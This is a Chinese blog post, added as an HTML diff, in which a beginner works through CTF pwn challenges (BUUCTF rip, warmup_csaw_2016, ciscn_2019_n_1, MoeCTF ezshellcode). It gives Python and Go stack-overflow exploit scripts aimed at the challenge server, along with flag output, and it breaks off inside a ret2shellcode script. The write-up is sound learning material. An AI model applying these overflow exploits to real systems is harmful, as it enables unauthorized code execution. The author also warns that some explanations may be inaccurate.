@@ -1,0 +1,256 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>Learn Pwn · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-08-05">2025年8月5日</time>
+        
+        
+          <span class="post__readtime">22 分钟</span>
+        
+        
+      </p>
+    
+    <h1 class="post__title">Learn Pwn</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>声明:</p>
+<p>我不会pwn， 也没有任何基础</p>
+<p>这是我闲着没事随便找pwn题玩的</p>
+<p>所以难免会有一些不准确的知识会误导您</p>
+</blockquote>
+<h2 id="buuctf-pwn-rip"><a href="#buuctf-pwn-rip" class="headerlink" title="buuctf - pwn - rip"></a>buuctf - pwn - rip</h2><p>再次叠甲 写这题的时候啥也不会</p>
+<p>看了一眼<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">栈溢出原理</a></p>
+<p>这这个题目与演示的demo一模一样</p>
+<p>所以</p>
+<p>比葫芦画瓢</p>
+<p>该字符串距离 rbp 的长度为 0xf<br><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052256395.png" alt="image-20250805225635205"></p>
+<p>那么相应的栈结构为</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     retaddr     |  &lt;-- 返回地址（return address）</span></span><br><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     saved rbp   |  &lt;-- 保存的基址寄存器（RBP）</span></span><br><span class="line"><span class="code">      rbp---&gt;+-----------------+</span></span><br><span class="line"><span class="code">             |                 |  &lt;-- 局部变量 / 临时空间（向低地址）</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">s,rbp-0xf --&gt;+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>后门函数是<code>fun</code> 可以在ida 中看到<code>fun</code>的地址<code>0x401186</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052300791.png" alt="image-20250805230025646"></p>
+<p>那么如果我们读取的字符串为<code>0xf * &#39;a&#39; + &#39;b&#39; * 8 + fun_addr</code></p>
+<p>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved rbp 覆盖为 bbbbbbbb，将 retaddr 覆盖为 func_addr</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     0x401186    |</span></span><br><span class="line"><span class="code">             +-----------------+</span></span><br><span class="line"><span class="code">             |     bbbbbbbb    |</span></span><br><span class="line"><span class="code">      rbp---&gt;+-----------------+</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">             |                 |</span></span><br><span class="line"><span class="code">s,ebp-0xf --&gt;+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>ok 现在直接拿ctf WIKI上面的代码来打</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27268</span>)</span><br><span class="line">success_addr = <span class="number">0x401187</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf</span> + <span class="string">b&#x27;v&#x27;</span> * <span class="number">8</span> + p64(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p64(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052311785.png" alt="image-20250805231109728"></p>
+<p>我将<code>success_addr</code> 设置为 0x401186的时候 打不通</p>
+<p>听朋友说要栈对齐 ，反正我现在是不懂这是啥玩意</p>
+<p>做法就是</p>
+<p>在<code>p64(success_addr)</code>前面随便加上一个return的地址</p>
+<p>那么修改后的代码就是这样子的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27268</span>)</span><br><span class="line">success_addr = <span class="number">0x401186</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf</span> + <span class="string">b&#x27;v&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x401185</span>) +p64(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p64(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>确实也能打通</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052314092.png" alt="image-20250805231443952"></p>
+<p>另外</p>
+<p>题外事</p>
+<p>我闲着没事干将exp用go写了一下</p>
+<p>下面是源代码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	r, err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;node5.buuoj.cn:27268&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Success connect to our Target&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> r.Close()</span><br><span class="line">	funcAddr := <span class="type">uint64</span>(<span class="number">0x401187</span>)</span><br><span class="line"></span><br><span class="line">	payload := bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">0xf</span>)</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">8</span>)...)</span><br><span class="line">	addrBuf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	err = binary.Write(addrBuf, binary.LittleEndian, funcAddr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,addrBuf.Bytes()...)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Our payload is ==&gt; &quot;</span>,payload)</span><br><span class="line">	r.Write(payload)</span><br><span class="line">	r.Write([]<span class="type">byte</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Try to input some Command&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> io.Copy(r, os.Stdin)</span><br><span class="line">	io.Copy(os.Stdout, r)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确实也能打通</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508052316523.png" alt="image-20250805231656249"></p>
+<h2 id="buuctf-pwn-warmup-csaw-2016"><a href="#buuctf-pwn-warmup-csaw-2016" class="headerlink" title="buuctf - pwn - warmup_csaw_2016"></a>buuctf - pwn - warmup_csaw_2016</h2><p>这个题目和上面这个rip一样 都是一个很简单的栈溢出</p>
+<p>使用gets 像v5中存入数据 v5 rbp 的长度为 0x40</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508061133856.png" alt="image-20250806113319768"></p>
+<p>刚开始会将<code>sub_40060D</code>的地址打印出来</p>
+<p>改函数会直接执行<code>cat flag.txt</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508061134381.png" alt="image-20250806113441337"></p>
+<p>ok , 还是用昨天的exp</p>
+<p>将昨天的exp修改一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ <span class="built_in">cp</span> pwn1.py warmup_csaw_2016.py</span><br><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ vim warmup_csaw_2016.py </span><br><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ python3 warmup_csaw_2016.py </span><br><span class="line">[+] Opening connection to node5.buuoj.cn on port 25895: Done</span><br><span class="line">b<span class="string">&#x27;\r\x06@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;flag&#123;4319e3b5-xxx-xxxx-xxxx-0e1842b5277d&#125;</span><br><span class="line"><span class="built_in">timeout</span>: the monitored <span class="built_in">command</span> dumped core</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25895</span>)</span><br><span class="line">success_addr = <span class="number">0x40060d</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + <span class="string">b&#x27;v&#x27;</span> * <span class="number">8</span>  +p64(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p64(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	r, err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;node5.buuoj.cn:25895&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Success connect to our Target&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> r.Close()</span><br><span class="line">	funcAddr := <span class="type">uint64</span>(<span class="number">0x40060E</span>)</span><br><span class="line"></span><br><span class="line">	payload := bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">0x40</span>)</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">8</span>)...)</span><br><span class="line">	addrBuf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	err = binary.Write(addrBuf, binary.LittleEndian, funcAddr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,addrBuf.Bytes()...)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Our payload is ==&gt; &quot;</span>,payload)</span><br><span class="line">	r.Write(payload)</span><br><span class="line">	r.Write([]<span class="type">byte</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Try to input some Command&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> io.Copy(r, os.Stdin)</span><br><span class="line">	io.Copy(os.Stdout, r)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ <span class="built_in">cp</span> pwn1.go  warmup_csaw_2016.go</span><br><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ vim warmup_csaw_2016.go </span><br><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ go run warmup_csaw_2016.go </span><br><span class="line">Success connect to our Target</span><br><span class="line">Our payload is ==&gt;  [97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 97 14 6 64 0 0 0 0 0]</span><br><span class="line">Try to input some Command</span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;flag&#123;4319e3b5-xxx-xxxxx-91f2-0e1842b5277d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>亦是栈溢出</p>
+<p>用gets录入v1变量</p>
+<p>然后判断v2的值是否为11.28125</p>
+<p>如果v2的值为11.28125，则执行system(“cat &#x2F;flag”)命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508082211610.png" alt="image-20250808221148377"></p>
+<p>在栈上面v1占的位置是 <code>0x04 ~ 0x30</code>v2占的未知是<code>0x00~0x04</code></p>
+<p>栈的内存布局（低地址在下，高地址在上）大概是：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[高地址]</span>  v2 (<span class="number">4</span>字节, float)</span><br><span class="line">          v1 (<span class="number">44</span>字节, char数组)</span><br><span class="line"><span class="selector-attr">[低地址]</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们输入44字节数据 然后在输入 4字节值为<code>11.28125</code>的浮点数 将v2覆盖成<code>11.28125</code></p>
+<p>那么exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yliken@yliken-virtual-machine:~/Desktop/pwn$ cat ciscn_2019_n_1.py </span><br><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29809</span>)</span><br><span class="line">target_value = struct.pack(<span class="string">&quot;&lt;f&quot;</span>, <span class="number">11.28125</span>)</span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">44</span> + target_value</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508082217086.png" alt="image-20250808221703728"></p>
+<p>闲着没事</p>
+<p>依旧用Go重写一遍</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   need</span></span><br><span class="line"><span class="comment">   a * 44</span></span><br><span class="line"><span class="comment">   and</span></span><br><span class="line"><span class="comment">   v2 = 11.28125</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	target := <span class="string">&quot;node5.buuoj.cn:29809&quot;</span></span><br><span class="line">	conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,target)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	fmt.Println(<span class="string">&quot;Successfully connect to the Target&quot;</span>)</span><br><span class="line">	payload := bytes.Repeat([]<span class="type">byte</span>(<span class="string">&quot;a&quot;</span>),<span class="number">44</span>)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">	binary.LittleEndian.PutUint32(buf, math.Float32bits(<span class="number">11.28125</span>))</span><br><span class="line">	payload = <span class="built_in">append</span>(payload,buf...)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Our Payload is ==&gt; &quot;</span>, payload)</span><br><span class="line">	conn.Write(payload)</span><br><span class="line">	conn.Write([]<span class="type">byte</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">	<span class="keyword">go</span> io.Copy(conn,os.Stdin)</span><br><span class="line">	io.Copy(os.Stdout,conn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508082218285.png" alt="35483a66-41f1-45c6-81ff-5a2a47c4c4cc"></p>
+<h2 id="MoeCTF2024-ezshellcode"><a href="#MoeCTF2024-ezshellcode" class="headerlink" title="MoeCTF2024 ezshellcode"></a>MoeCTF2024 ezshellcode</h2><p>看了官方wp </p>
+<p>wp只给了一个exp</p>
+<p>然后又提到了这是ret2shellcode</p>
+<p>然后就去看了一下<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">ret2shellcode基本的概念</a></p>
+<p>ida分析如果 <code>nbytes &gt; 96</code>，就会发生 <strong>栈溢出</strong>，覆盖返回地址</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509042309316.png" alt="image-20250904230946183"></p>
+<p><code>nbytes_4</code> 是一个 <strong>96 字节的栈缓冲区</strong>。</p>
+<p><code>nbytes</code>没有输入限制 如果是一个远大于96的数字 可能会发生溢出</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509042343292.png" alt="image-20250904234348185"></p>
+<p>nx保护未开启 ，可以将shellcode写到栈上</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509042345004.png" alt="image-20250904234503883"></p>
+<blockquote>
+<p>我的不准确的理解</p>
+<p>其实这和前面的栈溢出的一样的</p>
+<p>只不过前面都是将<code>return address</code>覆盖成已经存在的恶意函数的地址</p>
+<p>而这个是将<code>return address</code>覆盖成缓冲区的地址</p>
+<p>然后在缓冲区中写入 shellcode 从而进行攻击</p>
+</blockquote>
+<p>所以就是写入shellcode 然后补齐数据 最后将<code>return address</code>覆盖成程序给出的地址就行了</p>
+<p>exp1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line"><span class="comment"># sh = remote(&quot;192.168.222.1&quot;,56459)</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;140&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;you :\n&quot;</span>)</span><br><span class="line">funcAddr = sh.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;funcAddr ==&gt;&quot;</span> ,funcAddr)</span><br><span class="line">funcAddr_int = <span class="built_in">int</span>(funcAddr.decode(), <span class="number">16</span>)</span><br><span class="line">shellcode = <span 